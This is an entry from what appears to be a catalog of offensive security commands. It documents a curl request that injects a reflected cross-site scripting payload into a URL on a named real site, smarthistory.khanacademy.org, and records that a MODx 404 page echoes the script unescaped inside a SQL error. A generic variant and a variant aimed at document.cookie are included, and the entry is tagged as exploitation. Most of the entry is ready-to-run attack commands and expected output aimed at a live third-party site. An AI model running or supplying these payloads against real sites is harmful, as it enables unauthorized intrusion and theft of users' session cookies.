---
id: cmd-uuid-3
data: >-
  curl -X GET
  "http://smarthistory.khanacademy.org/Campin/jeatest'\"><script>alert(4);</script>"
  -H "Host: smarthistory.khanacademy.org" -H "Accept: */*" -H "Accept-Language:
  en" -H "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64;
  x64; Trident/5.0)" --connect-timeout 10
tags:
  - xss
  - exploitation
type: command
output: >-
  HTTP/1.1 404 Not Found ... HTML with unescaped <script>alert(4);</script> in
  SQL error
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:47.396Z'
verified: false
validated: true
submitted: true
---
# inject-xss-payload-into-url-for-reflection

## Command

```bash
curl -X GET "http://smarthistory.khanacademy.org/Campin/jeatest'\"><script>alert(4);</script>" -H "Host: smarthistory.khanacademy.org" -H "Accept: */*" -H "Accept-Language: en" -H "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)" --connect-timeout 10
```

## Description

Injects an XSS payload into the URL to reflect unescaped JavaScript in the SQL error message on the MODx 404 page.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Path | URL with XSS payload (e.g., /Campin/jeatest'\"><script>alert(4);</script>) | Yes |
| Host | Target domain | Yes |
| User-Agent | Mimic browser for realistic request | No |

## Examples

### Basic Usage

```bash
curl -X GET "http://target.com/path'\"><script>alert(1)</script>" -H "Host: target.com"
```

### Advanced Usage

```bash
curl -X GET "http://smarthistory.khanacademy.org/Campin/jeatest'\"><script>alert(document.cookie);</script>" -H "Host: smarthistory.khanacademy.org" -H "User-Agent: Mozilla/5.0 ..." --connect-timeout 10 -v
```

## Expected Output

404 page HTML echoing the payload without escaping, e.g., VALUES ('/path'\"><script>alert(4);</script>','IP', ...), executing the script on render.

## Related

- [[Related Procedure: Exploit-Reflected-XSS-via-SQL-Error-Output]]
